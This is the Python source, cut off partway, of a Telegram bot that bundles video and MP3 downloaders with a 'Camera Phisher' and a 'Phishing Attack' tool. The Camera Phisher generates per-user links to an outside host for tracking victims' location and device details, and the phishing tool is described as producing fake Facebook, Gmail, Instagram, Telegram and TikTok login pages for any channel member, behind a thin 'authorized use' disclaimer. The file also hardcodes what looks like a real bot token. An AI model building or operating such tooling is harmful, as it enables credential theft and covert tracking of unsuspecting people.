import logging
import os
import json
import subprocess
import asyncio
import tempfile
import shutil
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.error import NetworkError, TelegramError
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def install_dependencies():
    """Auto-install yt-dlp if not already installed"""
    try:
        # Check different ways yt-dlp might be installed
        checks = [
            (["python3", "-m", "yt_dlp", "--version"], "python3 -m yt_dlp"),
            (["python", "-m", "yt_dlp", "--version"], "python -m yt_dlp"),
            (["yt-dlp", "--version"], "yt-dlp direct"),
        ]
        
        installed = False
        working_python = None
        
        for cmd, name in checks:
            try:
                result = subprocess.run(cmd, capture_output=True, timeout=5, text=True)
                if result.returncode == 0:
                    logger.info(f"✅ yt-dlp is available ({name})")
                    installed = True
                    working_python = cmd[0] if cmd[0] in ["python3", "python"] else "yt-dlp"
                    break
            except:
                continue
        
        if not installed:
            logger.info("Installing yt-dlp for python3...")
            result = subprocess.run(["python3", "-m", "pip", "install", "--upgrade", "yt-dlp"], 
                                  capture_output=True, timeout=60, text=True)
            if result.returncode == 0:
                logger.info("✅ yt-dlp installed for python3")
            else:
                logger.warning(f"⚠️ Installation issue: {result.stderr[:100]}")
    except Exception as e:
        logger.warning(f"⚠️ Could not auto-install dependencies: {e}")

# Detect which yt-dlp command works on this system
WORKING_YTDLP_CMD = None

def detect_ytdlp_command():
    """Detect which yt-dlp invocation method works"""
    global WORKING_YTDLP_CMD
    
    commands_to_test = [
        (["python3", "-m", "yt_dlp", "--version"], "python3"),
        (["python", "-m", "yt_dlp", "--version"], "python"),
        (["yt-dlp", "--version"], "yt-dlp"),
    ]
    
    for cmd, name in commands_to_test:
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=5, text=True)
            if result.returncode == 0 and result.stdout.strip():
                WORKING_YTDLP_CMD = name
                logger.info(f"✅ Using yt-dlp via: {name}")
                return name
        except:
            pass
    
    logger.error("❌ yt-dlp not available via any method!")
    return None

# Install dependencies on startup
install_dependencies()
detect_ytdlp_command()

# Config from .env
BOT_TOKEN = os.getenv("BOT_TOKEN", "8593966553:AAFGoliiS_woNCydJhXBQ6sdi2xhKTAdAoc")
CHANNEL_ID = os.getenv("CHANNEL_ID", -1002693989550)
CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "cyberkid25")
ADMIN_ID = int(os.getenv("ADMIN_ID", "1530069749"))

# Database file
USERS_DB = "users_data.json"
BLOCKED_USERS_DB = "blocked_users.json"
FEATURE_USAGE_DB = "feature_usage.json"

# ==================== DATABASE FUNCTIONS ====================

def load_users():
    """Load users from JSON database"""
    if os.path.exists(USERS_DB):
        with open(USERS_DB, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    """Save users to JSON database"""
    with open(USERS_DB, 'w') as f:
        json.dump(users, f, indent=2)

def add_user(user_id, username, first_name):
    """Add user to database"""
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            "username": username,
            "first_name": first_name,
            "joined_at": datetime.now().isoformat(),
            "active": True
        }
        save_users(users)

def load_blocked_users():
    """Load blocked users"""
    if os.path.exists(BLOCKED_USERS_DB):
        with open(BLOCKED_USERS_DB, 'r') as f:
            return json.load(f)
    return []

def save_blocked_users(blocked):
    """Save blocked users"""
    with open(BLOCKED_USERS_DB, 'w') as f:
        json.dump(blocked, f, indent=2)

def is_user_blocked(user_id):
    """Check if user is blocked"""
    return str(user_id) in load_blocked_users()

def block_user(user_id):
    """Block a user"""
    blocked = load_blocked_users()
    if str(user_id) not in blocked:
        blocked.append(str(user_id))
        save_blocked_users(blocked)

def unblock_user(user_id):
    """Unblock a user"""
    blocked = load_blocked_users()
    if str(user_id) in blocked:
        blocked.remove(str(user_id))
        save_blocked_users(blocked)

def get_total_users():
    """Get total users count"""
    users = load_users()
    return len(users)

def get_active_users():
    """Get active users count"""
    users = load_users()
    return sum(1 for u in users.values() if u.get('active', True))

def load_feature_usage():
    """Load feature usage from JSON database"""
    if os.path.exists(FEATURE_USAGE_DB):
        with open(FEATURE_USAGE_DB, 'r') as f:
            return json.load(f)
    return {
        "cam": 0,
        "phish_facebook": 0,
        "phish_gmail": 0,
        "phish_instagram": 0,
        "phish_telegram": 0,
        "phish_tiktok": 0,
        "dl_tiktok": 0,
        "dl_facebook": 0,
        "dl_youtube": 0,
        "dl_spotify": 0,
        "dl_youtube_music": 0,
        "dl_soundcloud": 0,
        "dl_apple_music": 0
    }

def save_feature_usage(usage):
    """Save feature usage to JSON database"""
    with open(FEATURE_USAGE_DB, 'w') as f:
        json.dump(usage, f, indent=2)

def track_feature_usage(feature_name):
    """Track feature usage"""
    usage = load_feature_usage()
    if feature_name in usage:
        usage[feature_name] += 1
        save_feature_usage(usage)

# ==================== DOWNLOAD FUNCTIONS ====================

def check_yt_dlp_installed() -> bool:
    """Check if yt-dlp is installed and accessible"""
    try:
        result = subprocess.run(
            ["python", "-m", "yt_dlp", "--version"],
            capture_output=True,
            timeout=5,
            text=True
        )
        # Check stdout for version string (yt-dlp may return 1 due to warnings)
        return "2026" in result.stdout or "2025" in result.stdout or "2024" in result.stdout
    except Exception as e:
        logger.error(f"yt-dlp check failed: {e}")
        return False

def validate_url(url: str, platform: str) -> bool:
    """Validate URL format for each platform"""
    url_lower = url.lower().strip()
    
    validators = {
        "TikTok": lambda u: "tiktok.com" in u or "vm.tiktok.com" in u or "vt.tiktok.com" in u,
        "Facebook": lambda u: "facebook.com" in u or "fb.watch" in u or "fb.com" in u,
        "YouTube": lambda u: "youtube.com" in u or "youtu.be" in u or "m.youtube.com" in u,
        "Spotify": lambda u: "spotify.com" in u,
        "YouTube Music": lambda u: "music.youtube.com" in u or "youtube.com" in u or "youtu.be" in u,
        "SoundCloud": lambda u: "soundcloud.com" in u,
        "Apple Music": lambda u: "music.apple.com" in u
    }
    
    validator = validators.get(platform)
    return validator(url_lower) if validator else False

async def download_video(url: str, platform: str) -> dict:
    """Download video using yt-dlp with fallback options"""
    temp_dir = None
    try:
        if not WORKING_YTDLP_CMD:
            logger.error("❌ yt-dlp not configured. Reinstalling...")
            install_dependencies()
            detect_ytdlp_command()
            if not WORKING_YTDLP_CMD:
                logger.error("❌ yt-dlp still not available")
                return None
        
        # Create temporary directory
        temp_dir = tempfile.mkdtemp(prefix="video_")
        logger.info(f"📁 Created temp dir: {temp_dir}")
        
        output_template = os.path.join(temp_dir, "%(title)s.%(ext)s")
        logger.info(f"🎬 Starting video download from {platform}: {url[:60]}")
        
        # Build commands based on what we know works
        commands_to_try = []
        if WORKING_YTDLP_CMD == "python3":
            commands_to_try.append(["python3", "-m", "yt_dlp", "--quiet", "-f", "best[ext=mp4]/best", "-o", output_template, "--max-filesize", "30M", "-S", "res,ext:mp4:m4a", url])
        elif WORKING_YTDLP_CMD == "python":
            commands_to_try.append(["python", "-m", "yt_dlp", "--quiet", "-f", "best[ext=mp4]/best", "-o", output_template, "--max-filesize", "30M", "-S", "res,ext:mp4:m4a", url])
        elif WORKING_YTDLP_CMD == "yt-dlp":
            commands_to_try.append(["yt-dlp", "--quiet", "-f", "best[ext=mp4]/best", "-o", output_template, "--max-filesize", "30M", "-S", "res,ext:mp4:m4a", url])
        
        # Add fallback options
        commands_to_try.extend([
            ["python3", "-m", "yt_dlp", "--quiet", "-f", "best[ext=mp4]/best", "-o", output_template, "--max-filesize", "30M", "-S", "res,ext:mp4:m4a", url],
            ["python", "-m", "yt_dlp", "--quiet", "-f", "best[ext=mp4]/best", "-o", output_template, "--max-filesize", "30M", "-S", "res,ext:mp4:m4a", url],
            ["yt-dlp", "--quiet", "-f", "best[ext=mp4]/best", "-o", output_template, "--max-filesize", "30M", "-S", "res,ext:mp4:m4a", url],
        ])
        
        result = None
        for attempt_num, cmd in enumerate(commands_to_try, 1):
            try:
                cmd_name = cmd[0]
                logger.info(f"📥 Attempt {attempt_num}: Trying '{cmd_name}'")
                
                result = await asyncio.to_thread(
                    lambda c=cmd: subprocess.run(c, capture_output=True, timeout=240, text=True, cwd=temp_dir)
                )
                
                logger.info(f"   Return code: {result.returncode}")
                if result.stdout:
                    logger.info(f"   Stdout: {result.stdout[:150]}")
                if result.stderr:
                    logger.info(f"   Stderr: {result.stderr[:150]}")
                
                # List files in temp_dir after attempt
                files_after = os.listdir(temp_dir) if os.path.exists(temp_dir) else []
                logger.info(f"   Files in temp_dir: {files_after}")
                
                # Check if download succeeded
                if result.returncode == 0:
                    logger.info(f"   ✅ Command succeeded!")
                    break
                    
            except FileNotFoundError as e:
                logger.warning(f"   ❌ Command not found: {cmd_name}")
                continue
            except subprocess.TimeoutExpired:
                logger.warning(f"   ❌ Timeout (240s exceeded)")
                continue
            except Exception as e:
                logger.warning(f"   ❌ Error: {str(e)[:100]}")
                continue
        
        # Check for successful download
        logger.info(f"🔍 Checking for downloaded files in {temp_dir}")
        if os.path.exists(temp_dir):
            all_files = os.listdir(temp_dir)
            logger.info(f"   All files: {all_files}")
            
            video_files = [f for f in all_files if f.endswith(('.mp4', '.mkv', '.webm', '.avi', '.mov', '.flv'))]
            logger.info(f"   Video files found: {video_files}")
            
            if video_files:
                video_file = os.path.join(temp_dir, video_files[0])
                file_size = os.path.getsize(video_file)
                logger.info(f"   ✅ Video ready: {video_files[0]} ({file_size / (1024*1024):.1f}MB)")
                
                if file_size > 0:
                    return {
                        'file_path': video_file,
                        'temp_dir': temp_dir,
                        'filesize': file_size,
                        'title': os.path.splitext(video_files[0])[0][:100],
                        'uploader': platform,
                        'duration': 0,
                        'height': '?'
                    }
        
        err_msg = result.stderr if result else "Unknown error"
        logger.error(f"❌ Video download failed: {err_msg[:200]}")
        return None
        
    except asyncio.TimeoutError:
        logger.error("❌ Download timeout (240 seconds)")
        return None
    except Exception as e:
        logger.error(f"❌ Download error: {str(e)[:100]}")
        return None

async def download_audio(url: str, platform: str) -> dict:
    """Download audio using yt-dlp with fallback options"""
    temp_dir = None
    try:
        if not WORKING_YTDLP_CMD:
            logger.error("❌ yt-dlp not configured. Reinstalling...")
            install_dependencies()
            detect_ytdlp_command()
            if not WORKING_YTDLP_CMD:
                logger.error("❌ yt-dlp still not available")
                return None
        
        # Create temporary directory
        temp_dir = tempfile.mkdtemp(prefix="audio_")
        logger.info(f"📁 Created temp dir: {temp_dir}")
        
        output_template = os.path.join(temp_dir, "%(title)s.%(ext)s")
        logger.info(f"🎵 Starting audio download from {platform}: {url[:60]}")
        
        # Build commands based on what we know works
        commands_to_try = []
        
        # Primary method: MP3 extraction with the known working method
        base_mp3_cmd = ["-x", "--audio-format", "mp3", "--audio-quality", "128"]
        base_audio_cmd = []
        
        if WORKING_YTDLP_CMD == "python3":
            commands_to_try.append(["python3", "-m", "yt_dlp", "--quiet", "-f", "ba", "-S", "abr"] + base_mp3_cmd + ["-o", output_template, "--max-filesize", "30M", url])
            commands_to_try.append(["python3", "-m", "yt_dlp", "--quiet", "-f", "ba"] + base_audio_cmd + ["-o", output_template, "--max-filesize", "30M", url])
        elif WORKING_YTDLP_CMD == "python":
            commands_to_try.append(["python", "-m", "yt_dlp", "--quiet", "-f", "ba", "-S", "abr"] + base_mp3_cmd + ["-o", output_template, "--max-filesize", "30M", url])
            commands_to_try.append(["python", "-m", "yt_dlp", "--quiet", "-f", "ba"] + base_audio_cmd + ["-o", output_template, "--max-filesize", "30M", url])
        elif WORKING_YTDLP_CMD == "yt-dlp":
            commands_to_try.append(["yt-dlp", "--quiet", "-f", "ba", "-S", "abr"] + base_mp3_cmd + ["-o", output_template, "--max-filesize", "30M", url])
            commands_to_try.append(["yt-dlp", "--quiet", "-f", "ba"] + base_audio_cmd + ["-o", output_template, "--max-filesize", "30M", url])
        
        # Add fallback options
        commands_to_try.extend([
            ["python3", "-m", "yt_dlp", "--quiet", "-f", "ba"] + base_mp3_cmd + ["-o", output_template, "--max-filesize", "30M", url],
            ["python", "-m", "yt_dlp", "--quiet", "-f", "ba"] + base_mp3_cmd + ["-o", output_template, "--max-filesize", "30M", url],
            ["yt-dlp", "--quiet", "-f", "ba"] + base_mp3_cmd + ["-o", output_template, "--max-filesize", "30M", url],
            ["python3", "-m", "yt_dlp", "--quiet", "-f", "ba"] + base_audio_cmd + ["-o", output_template, "--max-filesize", "30M", url],
            ["python", "-m", "yt_dlp", "--quiet", "-f", "ba"] + base_audio_cmd + ["-o", output_template, "--max-filesize", "30M", url],
        ])
        
        result = None
        for attempt_num, cmd in enumerate(commands_to_try, 1):
            try:
                cmd_name = cmd[0]
                logger.info(f"📥 Attempt {attempt_num}: Trying '{cmd_name}'")
                
                result = await asyncio.to_thread(
                    lambda c=cmd: subprocess.run(c, capture_output=True, timeout=240, text=True, cwd=temp_dir)
                )
                
                logger.info(f"   Return code: {result.returncode}")
                if result.stdout:
                    logger.info(f"   Stdout: {result.stdout[:150]}")
                if result.stderr:
                    logger.info(f"   Stderr: {result.stderr[:150]}")
                
                # List files in temp_dir after attempt
                files_after = os.listdir(temp_dir) if os.path.exists(temp_dir) else []
                logger.info(f"   Files in temp_dir: {files_after}")
                
                # Check if download succeeded
                if result.returncode == 0:
                    logger.info(f"   ✅ Command succeeded!")
                    break
                    
            except FileNotFoundError as e:
                logger.warning(f"   ❌ Command not found: {cmd_name}")
                continue
            except subprocess.TimeoutExpired:
                logger.warning(f"   ❌ Timeout (240s exceeded)")
                continue
            except Exception as e:
                logger.warning(f"   ❌ Error: {str(e)[:100]}")
                continue
        
        # Check for successful download - look for any audio file
        logger.info(f"🔍 Checking for downloaded audio files in {temp_dir}")
        if os.path.exists(temp_dir):
            all_files = os.listdir(temp_dir)
            logger.info(f"   All files: {all_files}")
            
            audio_files = [f for f in all_files if f.endswith(('.mp3', '.m4a', '.opus', '.webm', '.wav', '.aac', '.ogg'))]
            logger.info(f"   Audio files found: {audio_files}")
            
            if audio_files:
                audio_file = os.path.join(temp_dir, audio_files[0])
                file_size = os.path.getsize(audio_file)
                logger.info(f"   ✅ Audio ready: {audio_files[0]} ({file_size / (1024*1024):.1f}MB)")
                
                if file_size > 0:
                    return {
                        'file_path': audio_file,
                        'temp_dir': temp_dir,
                        'filesize': file_size,
                        'title': os.path.splitext(audio_files[0])[0][:100],
                        'uploader': platform,
                        'duration': 0,
                        'quality': '192kbps'
                    }
        
        err_msg = result.stderr if result else "Unknown error"
        logger.error(f"❌ Audio download failed: {err_msg[:200]}")
        return None
        
    except asyncio.TimeoutError:
        logger.error("❌ Download timeout (240 seconds)")
        return None
    except Exception as e:
        logger.error(f"❌ Download error: {str(e)[:100]}")
        return None

async def download_image(url: str, platform: str) -> dict:
    """Download images from social media platforms using yt-dlp and fallback methods"""
    temp_dir = None
    try:
        if not WORKING_YTDLP_CMD:
            logger.error("❌ yt-dlp not configured. Reinstalling...")
            install_dependencies()
            detect_ytdlp_command()
            if not WORKING_YTDLP_CMD:
                logger.error("❌ yt-dlp still not available")
                return None
        
        # Create temporary directory
        temp_dir = tempfile.mkdtemp(prefix="image_")
        logger.info(f"📁 Created temp dir: {temp_dir}")
        
        output_template = os.path.join(temp_dir, "%(title)s.%(ext)s")
        logger.info(f"🖼️ Starting image download from {platform}: {url[:60]}")
        
        # Build commands based on what we know works
        # Use yt-dlp to extract images/videos from pages
        commands_to_try = []
        
        # For TikTok, try to handle both video and photo URLs
        if "tiktok" in url.lower():
            # TikTok videos (handles most cases)
            if WORKING_YTDLP_CMD == "python3":
                commands_to_try.append(["python3", "-m", "yt_dlp", "--quiet", "-f", "best", "-o", output_template, "--max-filesize", "50M", url])
                commands_to_try.append(["python3", "-m", "yt_dlp", "--quiet", "-f", "best[height<=720]", "-o", output_template, "--max-filesize", "50M", url])
            elif WORKING_YTDLP_CMD == "python":
                commands_to_try.append(["python", "-m", "yt_dlp", "--quiet", "-f", "best", "-o", output_template, "--max-filesize", "50M", url])
                commands_to_try.append(["python", "-m", "yt_dlp", "--quiet", "-f", "best[height<=720]", "-o", output_template, "--max-filesize", "50M", url])
            elif WORKING_YTDLP_CMD == "yt-dlp":
                commands_to_try.append(["yt-dlp", "--quiet", "-f", "best", "-o", output_template, "--max-filesize", "50M", url])
                commands_to_try.append(["yt-dlp", "--quiet", "-f", "best[height<=720]", "-o", output_template, "--max-filesize", "50M", url])
        else:
            # Other platforms (Instagram, Facebook, Twitter, Pinterest)
            if WORKING_YTDLP_CMD == "python3":
                commands_to_try.append(["python3", "-m", "yt_dlp", "--quiet", "-f", "best", "-o", output_template, "--max-filesize", "50M", url])
                commands_to_try.append(["python3", "-m", "yt_dlp", "--quiet", "-f", "bestvideo[ext=mp4]/best[ext=mp4]/best", "-o", output_template, "--max-filesize", "50M", url])
            elif WORKING_YTDLP_CMD == "python":
                commands_to_try.append(["python", "-m", "yt_dlp", "--quiet", "-f", "best", "-o", output_template, "--max-filesize", "50M", url])
                commands_to_try.append(["python", "-m", "yt_dlp", "--quiet", "-f", "bestvideo[ext=mp4]/best[ext=mp4]/best", "-o", output_template, "--max-filesize", "50M", url])
            elif WORKING_YTDLP_CMD == "yt-dlp":
                commands_to_try.append(["yt-dlp", "--quiet", "-f", "best", "-o", output_template, "--max-filesize", "50M", url])
                commands_to_try.append(["yt-dlp", "--quiet", "-f", "bestvideo[ext=mp4]/best[ext=mp4]/best", "-o", output_template, "--max-filesize", "50M", url])
        
        # Add minimal fallback options
        if WORKING_YTDLP_CMD == "python3":
            commands_to_try.append(["python3", "-m", "yt_dlp", "--quiet", "-o", output_template, "--max-filesize", "50M", url])
        elif WORKING_YTDLP_CMD == "python":
            commands_to_try.append(["python", "-m", "yt_dlp", "--quiet", "-o", output_template, "--max-filesize", "50M", url])
        elif WORKING_YTDLP_CMD == "yt-dlp":
            commands_to_try.append(["yt-dlp", "--quiet", "-o", output_template, "--max-filesize", "50M", url])
        
        result = None
        for attempt_num, cmd in enumerate(commands_to_try, 1):
            try:
                cmd_name = cmd[0]
                logger.info(f"📥 Attempt {attempt_num}: Trying '{cmd_name}'")
                
                result = await asyncio.to_thread(
                    lambda c=cmd: subprocess.run(c, capture_output=True, timeout=240, text=True, cwd=temp_dir)
                )
                
                logger.info(f"   Return code: {result.returncode}")
                if result.stdout:
                    logger.info(f"   Stdout: {result.stdout[:150]}")
                if result.stderr:
                    logger.info(f"   Stderr: {result.stderr[:150]}")
                
                # List files in temp_dir after attempt
                files_after = os.listdir(temp_dir) if os.path.exists(temp_dir) else []
                logger.info(f"   Files in temp_dir: {files_after}")
                
                # Check if download succeeded
                if result.returncode == 0:
                    logger.info(f"   ✅ Command succeeded!")
                    break
                    
            except FileNotFoundError as e:
                logger.warning(f"   ❌ Command not found: {cmd_name}")
                continue
            except subprocess.TimeoutExpired:
                logger.warning(f"   ❌ Timeout (240s exceeded)")
                continue
            except Exception as e:
                logger.warning(f"   ❌ Error: {str(e)[:100]}")
                continue
        
        # Check for successful download - look for image files
        logger.info(f"🔍 Checking for downloaded image files in {temp_dir}")
        if os.path.exists(temp_dir):
            all_files = os.listdir(temp_dir)
            logger.info(f"   All files: {all_files}")
            
            image_files = [f for f in all_files if f.endswith(('.jpg', '.jpeg', '.png', '.webp', '.gif', '.bmp', '.svg', '.mp4', '.webm'))]
            logger.info(f"   Image/Video files found: {image_files}")
            
            if image_files:
                image_file = os.path.join(temp_dir, image_files[0])
                file_size = os.path.getsize(image_file)
                logger.info(f"   ✅ Image ready: {image_files[0]} ({file_size / (1024*1024):.1f}MB)")
                
                if file_size > 0:
                    return {
                        'file_path': image_file,
                        'temp_dir': temp_dir,
                        'filesize': file_size,
                        'title': os.path.splitext(image_files[0])[0][:100],
                        'filename': image_files[0],
                        'uploader': platform,
                        'all_files': image_files
                    }
        
        err_msg = result.stderr if result else "Unknown error"
        
        # Check for specific error patterns
        if "Unsupported URL" in err_msg:
            logger.error(f"❌ Unsupported URL format for {platform}: {url}")
            logger.error(f"💡 Tip: For {platform}, try sending a direct post/video URL")
            return None
        elif "No such option" in err_msg:
            logger.error(f"❌ yt-dlp option error: {err_msg[:100]}")
            return None
        
        logger.error(f"❌ Image download failed: {err_msg[:200]}")
        return None
        
    except asyncio.TimeoutError:
        logger.error("❌ Download timeout (240 seconds)")
        return None
    except Exception as e:
        logger.error(f"❌ Download error: {str(e)[:100]}")
        return None

def cleanup_file(file_path: str) -> None:
    """Clean up temporary downloaded file and directory"""
    try:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)
            # Try to remove parent temp directory
            temp_dir = os.path.dirname(file_path)
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir, ignore_errors=True)
            logger.info(f"Cleaned up: {file_path}")
    except Exception as e:
        logger.warning(f"Could not cleanup file {file_path}: {e}")

# ==================== MAIN COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /start command"""
    user = update.effective_user
    user_id = user.id
    username = user.username if user.username else user.first_name
    
    # Check if user is blocked
    if is_user_blocked(user_id):
        await update.message.reply_text("❌ You are blocked from using this bot.")
        return
    
    # Add user to database
    add_user(user_id, username, user.first_name)
    
    # Check if user is member of channel
    is_member = await check_channel_membership(context, user_id)
    
    if is_member:
        await show_main_menu(update, username)
    else:
        await show_join_button(update, username)

async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /dashboard command (Admin only)"""
    user = update.effective_user
    user_id = user.id
    
    # Check if user is admin
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to access the dashboard.")
        return
    
    total_users = get_total_users()
    active_users = get_active_users()
    blocked_users = len(load_blocked_users())
    usage = load_feature_usage()
    
    # Get most and least used features
    feature_names = {
        "cam": "📷 Camera Phisher",
        "phish_facebook": "📘 Facebook Phishing",
        "phish_gmail": "📧 Gmail Phishing",
        "phish_instagram": "📷 Instagram Phishing",
        "phish_telegram": "✈️ Telegram Phishing",
        "phish_tiktok": "🎵 TikTok Phishing",
        "dl_tiktok": "🎥 TikTok Video",
        "dl_facebook": "📹 Facebook Video",
        "dl_youtube": "▶️ YouTube Video",
        "dl_spotify": "🎵 Spotify Audio",
        "dl_youtube_music": "▶️ YouTube Music",
        "dl_soundcloud": "🎧 SoundCloud Audio",
        "dl_apple_music": "🎼 Apple Music"
    }
    
    # Sort features by usage count (descending)
    sorted_features = sorted(usage.items(), key=lambda x: x[1], reverse=True)
    most_used = sorted_features[0] if sorted_features else ("None", 0)
    least_used = sorted_features[-1] if sorted_features else ("None", 0)
    
    # Create ranked list of all features
    ranked_features = "\n".join([
        f"{i+1}. {feature_names.get(fname, fname)}: {count} uses"
        for i, (fname, count) in enumerate(sorted_features)
    ])
    
    dashboard_text = f"""📊 ADMIN DASHBOARD

📈 User Statistics:
• Total Users: {total_users}
• Active Users: {active_users}
• Blocked Users: {blocked_users}

🔥 Feature Usage Analytics (Ranked):
{ranked_features}

📊 Summary:
• 🥇 Most Popular: {feature_names.get(most_used[0], 'None')} ({most_used[1]} uses)
• 🥉 Least Popular: {feature_names.get(least_used[0], 'None')} ({least_used[1]} uses)
• 📊 Total Feature Uses: {sum(usage.values())}
"""
    
    keyboard = [
        [InlineKeyboardButton("👥 User Management", callback_data="admin_users")],
        [InlineKeyboardButton("📢 Send Notification", callback_data="admin_notification")],
        [InlineKeyboardButton("🔄 Reset Statistics", callback_data="admin_reset_stats")],
        [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(dashboard_text, reply_markup=reply_markup, parse_mode="Markdown")

async def check_channel_membership(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> bool:
    """Check if user is member of the channel"""
    try:
        chat_member = await context.bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id)
        return chat_member.status in ["creator", "administrator", "member", "restricted"]
    except NetworkError as e:
        logger.warning(f"Network error checking membership (no internet?): {e}")
        # For local testing without internet, allow access
        return True
    except TelegramError as e:
        logger.error(f"Telegram error checking membership: {e}")
        return True
    except Exception as e:
        logger.error(f"Error checking membership: {e}")
        return True

# ==================== UI FUNCTIONS ====================

async def show_join_button(update: Update, username: str) -> None:
    """Show join channel button with verify option"""
    keyboard = [
        [InlineKeyboardButton("📱 Join Channel", url="https://t.me/cyberkid25")],
        [InlineKeyboardButton("✅ Verify Join", callback_data="check_join")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.message:
        await update.message.reply_text(
            f"Welcome {username}!\n\nTo use this bot, please join our channel first.\n\nClick the '📱 Join Channel' button to join the channel, and then click '✅ Verify Join' to verify.",
            reply_markup=reply_markup
        )
    else:
        await update.callback_query.edit_message_text(
            f"Welcome {username}!\n\nTo use this bot, please join our channel first.\n\nClick the '📱 Join Channel' button to join the channel, and then click '✅ Verify Join' to verify.",
            reply_markup=reply_markup
        )

async def show_main_menu(update: Update, username: str) -> None:
    """Show main menu with Camera Phisher, Phishing Attack, Download Video, Download MP3 buttons"""
    keyboard = [
        [
            InlineKeyboardButton("📷 Camera Phisher", callback_data="cam"),
            InlineKeyboardButton("🎣 Phishing Attack", callback_data="phish")
        ],
        [
            InlineKeyboardButton("🎬 Download Video", callback_data="download_video"),
            InlineKeyboardButton("🎵 Download MP3", callback_data="download_audio")
        ],
        [
            InlineKeyboardButton("🏪 Dark Store 🛍", callback_data="dark_store"),
        ],
                [
            InlineKeyboardButton("👤 Admin", callback_data="cam_admin")
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.message:
        await update.message.reply_text(
            text=f"Welcome {username}! 👋\n\n🤖 About This Bot:\n\nThis bot provides comprehensive security testing and content download tools:\n\n📷 Camera Phisher Tool\n• Generate tracking URLs for device location and user information\n• Realistic camera capture interface simulation\n• User identification and location tracking capabilities\n• Used for authorized security investigations and penetration testing\n\n🎣 Phishing Attack Tool\n• Create fake login pages for 5 platforms:\n  - 📘 Facebook (realistic login interface)\n  - 📧 Gmail (email authentication simulation)\n  - 📷 Instagram (social media login)\n  - ✈️ Telegram (messaging app interface)\n  - 🎵 TikTok (short video platform)\n• Used for authorized security awareness training and testing\n\n🎬 Download Video Tool\n• Download videos from multiple platforms:\n  - 🎥 TikTok (without watermark)\n  - 📹 Facebook (Reels & Videos)\n  - ▶️ YouTube (Shorts & Videos)\n• High quality downloads (up to 50MB)\n• Fast automatic processing (1-2 minutes)\n\n🎵 Download Audio Tool\n• Convert audio from music platforms to MP3:\n  - 🎵 Spotify (music & podcasts)\n  - ▶️ YouTube Music (playlists & albums)\n  - 🎧 SoundCloud (tracks & mixes)\n  - 🎼 Apple Music (music library)\n• 192 kbps quality MP3 format\n• Automatic metadata preservation\n\n ⚠️ Important Notice:\nAll tools should only be used responsibly and with proper authorization for:\n• Legitimate security testing purposes\n• Authorized penetration testing\n• Security awareness training\n• Content research and analysis\n\nUnauthorized use is prohibited by law.",
            reply_markup=reply_markup
        )
    else:
        await update.callback_query.edit_message_text(
            text=f"Hello {username}! 👋\n\n🤖 About This Bot:\n\nThis bot provides comprehensive security testing and content download tools:\n\n📷 Camera Phisher Tool\n• Generate tracking URLs for device location and user information\n• Realistic camera capture interface simulation\n• User identification and location tracking capabilities\n• Used for authorized security investigations and penetration testing\n\n🎣 Phishing Attack Tool\n• Create fake login pages for 5 platforms:\n  - 📘 Facebook (realistic login interface)\n  - 📧 Gmail (email authentication simulation)\n  - 📷 Instagram (social media login)\n  - ✈️ Telegram (messaging app interface)\n  - 🎵 TikTok (short video platform)\n• Used for authorized security awareness training and testing\n\n🎬 Download Video Tool\n• Download videos from multiple platforms:\n  - 🎥 TikTok (without watermark)\n  - 📹 Facebook (Reels & Videos)\n  - ▶️ YouTube (Shorts & Videos)\n• High quality downloads (up to 50MB)\n• Fast automatic processing (1-2 minutes)\n\n🎵 Download MP3 Tool\n• Convert audio from music platforms to MP3:\n  - 🎵 Spotify (music & podcasts)\n  - ▶️ YouTube Music (playlists & albums)\n  - 🎧 SoundCloud (tracks & mixes)\n  - 🎼 Apple Music (music library)\n• 192 kbps quality MP3 format\n• Automatic metadata preservation\n\n⚠️ Important Notice:\nAll tools should only be used responsibly and with proper authorization for:\n• Legitimate security testing purposes\n• Authorized penetration testing\n• Security awareness training\n• Content research and analysis\n\nUnauthorized use is prohibited by law.",
            reply_markup=reply_markup
        )

async def show_cam_menu(update: Update, username: str, user_id: int) -> None:
    """Show Camera Phisher menu"""
    keyboard = [
        [InlineKeyboardButton("🔗 Create URL", callback_data="cam_link")],
        [InlineKeyboardButton("⬅️ Back", callback_data="back_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        text="📷 Camera Phisher Tool\n\nThis tool is used to create URLs for tracking device location and user information.\n\nPlease select a function below:",
        reply_markup=reply_markup
    )

async def show_cam_link(update: Update, username: str, user_id: int) -> None:
    """Show Camera Phisher link"""
    cam_url = f"https://cam-apix.vercel.app/?id={user_id}"
    
    link_text = f"""🔗 Camera Phisher Link

🌐 Public URL:
{cam_url}

This link will show a realistic Camera Phisher page.

👤 Developer: @mengheang25"""
    
    keyboard = [
        [InlineKeyboardButton("🔗 Open Test", url=cam_url)],
        [InlineKeyboardButton("⬅️ Back", callback_data="cam")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        text=link_text,
        reply_markup=reply_markup
    )

async def show_phish_menu(update: Update, username: str, user_id: int) -> None:
    """Show Phishing Attack menu"""
    keyboard = [
        [InlineKeyboardButton("📘 Facebook", callback_data="phish_facebook")],
        [InlineKeyboardButton("📧 Gmail", callback_data="phish_gmail")],
